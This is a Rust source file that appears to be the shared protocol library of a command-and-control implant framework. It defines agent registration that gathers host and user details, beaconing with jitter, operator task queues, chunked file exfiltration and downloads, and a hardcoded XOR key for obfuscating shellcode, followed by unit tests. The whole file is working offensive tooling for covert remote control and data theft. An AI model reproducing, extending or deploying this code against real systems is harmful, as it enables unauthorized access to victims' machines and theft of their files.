use std::time::{SystemTime, UNIX_EPOCH};

use base64::Engine;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

pub type Timestamp = u64;

/// Bumped whenever the wire format changes incompatibly. The C2 rejects agents
/// that report a different major version instead of failing later on a
/// deserialization error.
pub const PROTOCOL_VERSION: u32 = 2;

/// Bytes per file-transfer chunk. Kept well under the server's body limit so a
/// single chunk never trips the 1 MiB request cap after base64 expansion.
pub const CHUNK_BYTES: usize = 64 * 1024;

pub fn now_secs() -> Timestamp {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct AgentInfo {
    #[serde(default)]
    pub id: String,
    #[serde(default)]
    pub name: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    #[serde(default)]
    pub ip: String,
}

impl AgentInfo {
    pub fn local(name: String) -> Self {
        let hostname = std::env::var("HOSTNAME")
            .or_else(|_| std::env::var("COMPUTERNAME"))
            .unwrap_or_else(|_| "unknown".to_string());
        let username = std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string());
        let pid = std::process::id();
        let os = std::env::consts::OS.to_string();
        let arch = std::env::consts::ARCH.to_string();
        Self {
            id: String::new(),
            name,
            hostname,
            username,
            os,
            arch,
            pid,
            ip: String::new(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterRequest {
    pub agent: AgentInfo,
    /// Desired beacon sleep; the C2 may override it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sleep: Option<u64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub jitter: Option<u64>,
    /// Protocol the agent was built against. Defaults to 1 so older agents
    /// still register and get a clear error instead of a parse failure.
    #[serde(default = "legacy_protocol")]
    pub protocol: u32,
}

fn legacy_protocol() -> u32 {
    1
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterResponse {
    pub id: String,
    #[serde(default = "default_sleep")]
    pub sleep: u64,
    #[serde(default)]
    pub jitter: u64,
}

fn default_sleep() -> u64 {
    10
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconRequest {
    pub id: String,
    #[serde(default = "now_secs")]
    pub timestamp: Timestamp,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct Task {
    pub id: String,
    pub command: String,
    #[serde(default)]
    pub args: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq, Eq)]
pub struct BeaconResponse {
    #[serde(default)]
    pub tasks: Vec<Task>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sleep: Option<u64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub jitter: Option<u64>,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
#[serde(rename_all = "lowercase")]
pub enum TaskStatus {
    #[default]
    Queued,
    /// Handed to the agent on a beacon; no result yet.
    Sent,
    Completed,
    Failed,
}

impl TaskStatus {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Queued => "queued",
            Self::Sent => "sent",
            Self::Completed => "completed",
            Self::Failed => "failed",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct TaskResult {
    pub task_id: String,
    #[serde(default)]
    pub output: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub exit_code: Option<i32>,
    /// Wall-clock duration of the command, for the task view.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub duration_ms: Option<u64>,
}

impl TaskResult {
    pub fn status(&self) -> TaskStatus {
        if self.error.is_some() {
            TaskStatus::Failed
        } else {
            TaskStatus::Completed
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ResultsRequest {
    pub id: String,
    #[serde(default)]
    pub results: Vec<TaskResult>,
}

/// One slice of a file moving in either direction. `index` is the zero-based
/// chunk number, so a receiver can place it without trusting arrival order.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct Chunk {
    /// Transfer identifier, unique per direction and per file.
    pub transfer: String,
    pub index: u32,
    /// Total number of chunks; lets the receiver size its buffer up front.
    pub total: u32,
    /// Base64 payload. Empty on the final chunk of a zero-length file.
    #[serde(default)]
    pub data: String,
}

impl Chunk {
    pub fn new(transfer: impl Into<String>, index: u32, total: u32, bytes: &[u8]) -> Self {
        Self {
            transfer: transfer.into(),
            index,
            total,
            data: base64::engine::general_purpose::STANDARD.encode(bytes),
        }
    }

    pub fn bytes(&self) -> Result<Vec<u8>, base64::DecodeError> {
        base64::engine::general_purpose::STANDARD.decode(self.data.as_bytes())
    }
}

/// Splits `data` into chunks. Always yields at least one chunk so an empty file
/// still completes the transfer instead of looking like it never started.
pub fn chunk_bytes(transfer: &str, data: &[u8]) -> Vec<Chunk> {
    let total = data.len().div_ceil(CHUNK_BYTES).max(1) as u32;
    let mut out = Vec::with_capacity(total as usize);
    for (index, slice) in data.chunks(CHUNK_BYTES).enumerate() {
        out.push(Chunk::new(transfer, index as u32, total, slice));
    }
    if out.is_empty() {
        out.push(Chunk::new(transfer, 0, 1, &[]));
    }
    out
}

/// Reassembles chunks into the original buffer, verifying order and count.
pub fn assemble_chunks(chunks: &[Chunk]) -> Result<Vec<u8>, String> {
    let Some(first) = chunks.first() else {
        return Err("no chunks received".to_string());
    };
    let total = first.total;
    if chunks.len() as u32 != total {
        return Err(format!(
            "expected {total} chunks, got {}",
            chunks.len()
        ));
    }
    let mut ordered = chunks.to_vec();
    ordered.sort_by_key(|c| c.index);
    let mut out = Vec::new();
    for (position, chunk) in ordered.iter().enumerate() {
        if chunk.index as usize != position {
            return Err(format!(
                "chunk {position} missing (got index {})",
                chunk.index
            ));
        }
        out.extend_from_slice(&chunk.bytes().map_err(|e| format!("chunk {position}: {e}"))?);
    }
    Ok(out)
}

/// Hex SHA-256, used to confirm a transfer survived the round trip.
pub fn sha256_hex(data: &[u8]) -> String {
    let digest = Sha256::digest(data);
    digest.iter().map(|b| format!("{b:02x}")).collect()
}

/// Agent -> C2: one chunk of a file being exfiltrated.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UploadRequest {
    pub id: String,
    /// Original filename as seen on the target.
    pub name: String,
    pub chunk: Chunk,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct UploadResponse {
    /// Chunks accepted so far, so the agent can resume after a dropped beacon.
    pub received: u32,
    pub total: u32,
    pub complete: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sha256: Option<String>,
}

/// Agent -> C2: fetch one chunk of a file the operator staged for upload.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DownloadRequest {
    pub transfer: String,
    pub index: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DownloadResponse {
    pub chunk: Chunk,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sha256: Option<String>,
}

pub const SHELLCODE_XOR_KEY: &[u8] = b"chamuko-2024-shellcode-xor-secret-key-v1";

pub fn xor_transform(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn chunk_round_trip_preserves_bytes() {
        let data: Vec<u8> = (0..200_000u32).map(|i| (i % 251) as u8).collect();
        let chunks = chunk_bytes("t1", &data);
        assert_eq!(chunks.len(), data.len().div_ceil(CHUNK_BYTES));
        assert_eq!(assemble_chunks(&chunks).unwrap(), data);
    }

    #[test]
    fn empty_file_still_produces_one_chunk() {
        let chunks = chunk_bytes("empty", &[]);
        assert_eq!(chunks.len(), 1);
        assert_eq!(chunks[0].total, 1);
        assert!(assemble_chunks(&chunks).unwrap().is_empty());
    }

    #[test]
    fn assemble_rejects_missing_chunks() {
        let data = vec![7u8; CHUNK_BYTES * 3];
        let mut chunks = chunk_bytes("t", &data);
        chunks.pop();
        assert!(assemble_chunks(&chunks).unwrap_err().contains("expected"));
    }

    #[test]
    fn assemble_reorders_out_of_order_chunks() {
        let data = vec![9u8; CHUNK_BYTES * 2];
        let mut chunks = chunk_bytes("t", &data);
        chunks.reverse();
        assert_eq!(assemble_chunks(&chunks).unwrap(), data);
    }

    #[test]
    fn sha256_matches_known_vector() {
        assert_eq!(
            sha256_hex(b"abc"),
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
    }

    #[test]
    fn legacy_register_without_protocol_field_is_version_1() {
        let json = r#"{"agent":{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1}}"#;
        let req: RegisterRequest = serde_json::from_str(json).unwrap();
        assert_eq!(req.protocol, 1);
    }

    #[test]
    fn task_result_status_reflects_error_field() {
        let ok = TaskResult {
            task_id: "t".into(),
            output: "x".into(),
            error: None,
            exit_code: Some(0),
            duration_ms: Some(3),
        };
        assert_eq!(ok.status(), TaskStatus::Completed);
        let bad = TaskResult {
            error: Some("boom".into()),
            ..ok
        };
        assert_eq!(bad.status(), TaskStatus::Failed);
    }
}
